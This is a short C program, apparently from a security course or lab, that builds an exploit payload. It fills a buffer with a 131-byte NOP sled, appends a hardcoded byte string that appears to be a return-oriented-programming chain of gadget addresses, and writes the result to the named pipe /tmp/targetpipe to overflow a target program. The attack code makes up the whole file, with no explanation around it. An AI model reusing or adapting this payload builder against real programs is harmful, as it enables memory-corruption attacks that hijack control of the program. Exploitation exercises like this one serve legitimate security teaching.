#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char strfinal[500]; 
  int i;
  for(i = 0; i < 131; i++)
    memcpy(strfinal + i, "\x90", 1);
  char copy[300] = "\xd4\xbe\xb3\xbb\xe1\xa0\xb9\xbb\xdc\x04\xbf\xbf\x88\x2d\xb5\xbb\x8a\xb8\xb7\xbb\xe1\xa0\xb9\xbb\xd8\x04\xbf\xbf\x88\x2d\xb5\xbb\x8a\xb8\xb7\xbb\xe1\xa0\xb9\xbb\xd4\x04\xbf\xbf\x88\x2d\xb5\xbb\x8a\xb8\xb7\xbb\x1b\xdc\xb9\xbb\x8a\x01\x40\x40\x2e\x3b\xb4\xbb\x8a\xe9\xb3\xbb\xe5\xb6\xa9\xbb\x2a\x01\xad\xbb\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x1b\xdc\xb9\xbb\x64\x05\xbf\xbf\x79\x2d\xb5\xbb\x1b\xdc\xb9\xbb\x90\x02\x30\x39\xe1\xa0\xb9\xbb\x78\x05\xbf\xbf\x88\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x7f\x20\x20\x01\x1b\xdc\xb9\xbb\x7f\x02\x02\x01\x8a\xe9\xb3\xbb\x1b\xdc\xb9\xbb\x7c\x05\xbf\xbf\x79\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x78\x05\xbf\xbf\x1b\xdc\xb9\xbb\x68\x05\xbf\xbf\x79\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x10\x40\x40\x40\x1b\xdc\xb9\xbb\x6c\x05\xbf\xbf\xe8\x27\xac\xbb\x79\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x62\x40\x40\x40\xe8\x27\xac\xbb\xe5\xb6\xa9\xbb\x90\x90\x90\x90";
  //[dummy bytes to be add esp]
  strcpy(strfinal + 131, copy);  
  writecmd(PIPEPATH, strfinal);
  return 0;
}
